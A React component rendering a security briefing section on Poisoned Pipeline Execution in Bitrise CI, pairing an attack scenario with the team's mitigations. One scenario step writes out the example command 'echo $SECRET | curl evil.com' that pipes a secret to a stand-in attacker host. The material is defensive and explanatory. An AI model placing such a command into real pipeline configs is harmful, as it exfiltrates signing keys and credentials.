import { C, Reveal, SectionLabel, SectionHeading, TagChip, InfoCard, CheckItem } from "../../shared.jsx";
import { P, PDim } from "./ui.jsx";

export function CriticalThreatSection() {
  const steps = [
    "Attacker forks repo or creates a feature branch",
    "Modifies bitrise.yml to add: echo $SECRET | curl evil.com",
    "Opens a Pull Request — CI automatically runs",
    "Secrets exfiltrated during the PR build execution",
  ];

  return (
    <section id="s-critical" style={{ maxWidth: 1100, margin: "0 auto", padding: "96px 48px" }}>
      <Reveal>
        <SectionLabel color={C.red}>CRITICAL THREAT</SectionLabel>
        <SectionHeading sub="The #1 security concern when CI config lives in the repository.">
          Poisoned Pipeline Execution
        </SectionHeading>
      </Reveal>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 24 }}>
        <Reveal delay={0}>
          <InfoCard color={C.red} tag="ATTACK SCENARIO" title="How it works" delay={0}>
            <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
              {steps.map((step, i) => (
                <div key={i} style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
                  <div style={{
                    width: 22, height: 22, borderRadius: 6, flexShrink: 0,
                    background: `${C.red}15`, border: `1px solid ${C.red}30`,
                    display: "flex", alignItems: "center", justifyContent: "center",
                    fontFamily: "'Syne', sans-serif", fontWeight: 800, fontSize: 11, color: C.red,
                  }}>
                    {i + 1}
                  </div>
                  <span style={{ fontFamily: "'DM Sans', sans-serif", fontSize: 13, color: C.muted, lineHeight: 1.6 }}>{step}</span>
                </div>
              ))}
            </div>
            <div style={{ marginTop: 20, padding: "12px 16px", background: `${C.red}08`, border: `1px solid ${C.red}25`, borderRadius: 10 }}>
              <span style={{ fontFamily: "'Syne', sans-serif", fontWeight: 700, fontSize: 11, color: C.red }}>IMPACT</span>
              <p style={{ fontFamily: "'DM Sans', sans-serif", fontSize: 12, color: C.muted, lineHeight: 1.6, marginTop: 6 }}>
                Complete compromise of App Store Connect API keys, code signing certificates, provisioning profiles, and service credentials.
              </p>
            </div>
          </InfoCard>
        </Reveal>

        <Reveal delay={0.15}>
          <InfoCard color={P} tag="BITRISE PROTECTION" title="Why we're protected" delay={0}>
            <p style={{ color: C.muted, fontSize: 14, lineHeight: 1.7, marginBottom: 20 }}>
              PRs from forks have <strong style={{ color: C.text }}>NO access to secrets</strong> by default. Protected secrets cannot be exposed in PRs — values always display as{" "}
              <code style={{ color: P, fontFamily: "'JetBrains Mono', monospace", fontSize: 12 }}>[REDACTED]</code>.
            </p>
            <div style={{ marginBottom: 16 }}>
              <TagChip color={P} dot={false}>ADDITIONAL MITIGATIONS</TagChip>
            </div>
            <CheckItem active>CODEOWNERS requires iOS Lead approval on bitrise.yml</CheckItem>
            <CheckItem active>Branch protection prevents direct pushes to main</CheckItem>
            <CheckItem active>Pre-commit secret scanning catches leaks before push</CheckItem>
            <CheckItem active>Protect all secrets via is_protected=True in Bitrise UI</CheckItem>
          </InfoCard>
        </Reveal>
      </div>
    </section>
  );
}
